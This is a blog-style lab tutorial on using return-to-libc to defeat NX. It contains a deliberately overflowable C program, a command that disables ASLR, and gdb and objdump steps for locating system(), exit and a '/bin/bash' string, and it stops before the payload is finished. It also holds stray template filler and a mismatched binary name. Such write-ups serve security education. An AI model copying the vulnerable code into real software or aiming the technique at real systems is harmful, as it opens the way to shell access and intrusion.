---
layout:       post
title:        "Defeating NX: The Return-to-libc Method"
category:     "Computing Systems"
tags:         system-security aslr nx
permalink:    /ret2libc/
---

In "[Defeating ASLR: The Return-to-pop Method](https://xingjianxuanyuan.github.io/ret2pop/)", I constructed a payload that used the <code>ret</code> and <code>pop-ret</code> instructions to inject shellcode into our vulnerable program with **ASLR**{: style="color: red"} enabled but non-executable stack (hereinafter "**NX**{: style="color: red"}") disabled. The payload worked just as expected because we knew that the memory space between <code>ans_buf</code> and the address we were returning to is larger than our shellcode. What if the memory space is not large enough? More importantly, what if we do not have a shellcode at our disposal? In this post, I would like to describe an exploitation technique called "**return-to-libc**{: style="color: red"}", which makes use of existing code (the C standard library) to spawn a shell. The documentation is organized into two parts: for the first part, the ASLR protection is turned off; and for the second part, both ASLR and NX are enabled.

<!-- excerpt-end -->

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## Part I

Let's first disable ASLR:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

The vulnerable program contains the following code:
```c
/* ans_check.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_answer(char *ans) {

    int ans_flag = 0;
    char ans_buf[38];

    strcpy(ans_buf, ans);

    if (strcmp(ans_buf, "forty-two") == 0)
        ans_flag = 1;
    
    return ans_flag;

}

int main(int argc, char *argv[]) {

    if (argc < 2) {
        printf("Usage: %s <answer>\n", argv[0]);
        exit(0);
    }
    if (check_answer(argv[1])) {
        printf("Right answer!\n");
    } else {
        printf("Wrong answer!\n");
    }

    printf("About to exit!\n");
    fflush(stdout);

    system("/bin/date");
    fflush(stdout);

}
```

Compile <code>ans_check.c</code> with the <code>-fno-stack-protector</code> option to disable stack canaries but with NX enabled, and run the program:
```bash
$ touch ans_check.c
$ vim ans_check.c
$ gcc -g -m32 -no-pie -fno-stack-protector ans_check.c -o ans_check
$ ./ans_check forty-one
Wrong answer!
About to exit!
Thu Oct  6 11:27:14 EDT 2022
```

The payload for the return-to-libc exploit should have the following structure:
<p id="console">PADDING | &system() | &exit_path | &cmd_string</p>
Ignoring the padding, the first two values are addresses of code. The third value is the address of a properly terminated string containing the same of the program that we wish to execute. In our examples, we will use "<code>/bin/bash</code>". The amount of <code>PADDING</code> must be such that the <code>&system()</code> value overwrites the return address on the stack.

### Addresses We Need

Let's find out the address of the <code>system()</code> system call:
```bash
$ objdump -D ans_check7 | grep system
08049110 <system@plt>:
 8049363:       e8 a8 fd ff ff          call   8049110 <system@plt>
```
We shall use the address <code>0x08049110</code> for <code>&system()</code>.

Find an address to serve as the <code>&exit_path</code>:
```bash
$ objdump -D ans_check7 | grep -A 30 \<main\>
080492ae <main>:
 ...
 80492ee:       6a 00                   push   $0x0
 80492f0:       e8 2b fe ff ff          call   8049120 <exit@plt>
 ...
 8049301:       e8 50 ff ff ff          call   8049256 <check_answer>
 8049306:       83 c4 10                add    $0x10,%esp
 ...
```
We shall use the address <code>0x080492ee</code> for <code>&exit(0)</code>. Additionally, it is shown above that the <code>check_answer()</code> function returns to the address <code>0x08049306</code>.

To find our input string "<code>/bin/bash</code>", the <code>find_var.c</code> program may be used:
```c
/* find_var.c */
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
    if (!argv[1])
        exit(1);
    printf("%p\n", getenv(argv[1]));
    return 0;
}
```
Or, we can also use <code>gdb</code>:
```console
gdb-peda$ x/20s 0xffffd7e2
0xffffd7e2:     "forty-one"
0xffffd7ec:     "SHELL=/bin/bash"
0xffffd7fc:     "SUDO_GID=1000"
0xffffd80a:     "SUDO_COMMAND=/usr/bin/su seed"
0xffffd828:     "SUDO_USER=ubuntu"
0xffffd839:     "PWD=/home/seed/Documents/cse523s/return2libc"
0xffffd866:     "LOGNAME=seed"
0xffffd873:     "_=/usr/bin/gdb"
0xffffd882:     "LINES=21"
0xffffd88b:     "HOME=/home/seed"
0xffffd89b:     "LANG=C.UTF-8"
...
```
The above results show that the string starts at <code>0xffffd7ec</code>. Nevertheless, running <code>find\_var.c</code>, I got the output <code>0xffffd832</code>. If we type <code>unset environment LINES</code> and <code>unset environment COLUMNS</code> in <code>gdb</code>, the two addresses should be identical.
<input type="checkbox" id="cb1" /><label for="cb1"><sup></sup></label><span><br><br>This is the footnote text.<br><br></span>
blablabla

### Assemble the Payload

We are now ready to construct our payload using the addresses we just gathered. First, run <code>echo &dollar;&dollar;</code>:
```bash
$ echo $$
2366
```